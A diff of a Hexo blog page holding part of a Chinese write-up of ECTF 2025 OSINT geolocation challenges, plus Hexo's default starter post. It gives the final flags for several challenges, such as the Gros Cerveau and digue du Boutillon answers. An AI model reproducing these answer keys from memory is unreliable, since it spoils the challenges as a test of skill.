 <p><img src="/../../../../CTF-win/%25E6%25AF%2594%25E8%25B5%259B/ECTF%2520(2025.01.24-26)/OSINT_1_-_question-5/PANO_20220408_134922.jpg" alt="PANO_20220408_134922"></p>
 <p>这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。</p>
 <p>然后便可以用谷歌识图来确认地点：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204133815353.png" alt="image-20250204133815353"></p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;Gros_Cerveau&#125;</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>ectf&#123;Gros_Cerveau&#125;
+</code></pre>
 <p>(在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。)</p>
 <h3 id="Project-153-Q6"><a href="#Project-153-Q6" class="headerlink" title="Project-153-Q6"></a>Project-153-Q6</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113418057.png" alt="image-20250204113418057"></p>
 <p>这道题我们会得到这张图片：</p>
@@ -548,12 +808,8 @@
 <p>至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204134657214.png" alt="image-20250204134657214"></p>
 <p>最后的flag为：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ectf</span>&#123;<span class="hljs-number">262</span>_04360&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;262_04360&#125;
+</code></pre>
 <h3 id="PNJ-3-Gouzou"><a href="#PNJ-3-Gouzou" class="headerlink" title="PNJ - 3 - Gouzou"></a>PNJ - 3 - Gouzou</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113429216.png" alt="image-20250204113429216"></p>
 <p>这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113832122.png" alt="image-20250204113832122"></p>
@@ -564,8 +820,8 @@
 <p>通过搜索“île de ré gouzou”可以找到这个网页：<a target="_blank" rel="noopener" href="https://www.realahune.fr/les-murs-dexpression-de-latlantique/%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%8F%91%E7%8E%B0%EF%BC%9A">https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现：</a></p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204114831304.png" alt="image-20250204114831304"></p>
 <p>于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;digue_du_boutillon&#125;</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>ectf&#123;digue_du_boutillon&#125;
+</code></pre>
 
             
         </div>
@@ -597,17 +853,17 @@
         <div class="content" v-pre>
             
             <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
-
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="language-bash">$ hexo new &quot;My New Post&quot;
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="language-bash">$ hexo server
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="language-bash">$ hexo generate
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="language-bash">$ hexo deploy
+</code></pre>
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
             
